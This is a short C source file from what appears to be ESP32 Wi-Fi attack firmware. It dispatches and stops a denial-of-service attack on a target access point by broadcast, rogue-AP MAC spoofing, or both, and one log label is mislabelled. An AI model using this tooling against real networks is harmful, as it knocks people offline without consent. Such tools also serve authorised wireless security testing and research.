#include "Attack/attack_dos.h"


#include "esp_log.h"
#include "esp_err.h"

#include "AttackLog/log.h"

#include "Attack/attack.h"
#include "Attack/attack_method.h"
#include "WifiController/wifi_controller.h"

static const char *TAG = "attack_dos";
static attack_dos_methods_t method = (attack_dos_methods_t) -1;

void attack_dos_start(attack_config_t *attack_config) {
    ATTACK_LOG_I(TAG, "Starting DoS attack...");
    method = (attack_dos_methods_t) attack_config->method;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ATTACK_LOG_D(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ATTACK_LOG_D(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ATTACK_LOG_D(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        default:
            ATTACK_LOG_E(TAG, "Unknown DOS method");
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ATTACK_LOG_E(TAG, "Unknown method! Stop fail");
    }
    ATTACK_LOG_I(TAG, "DoS attack stopped");
}
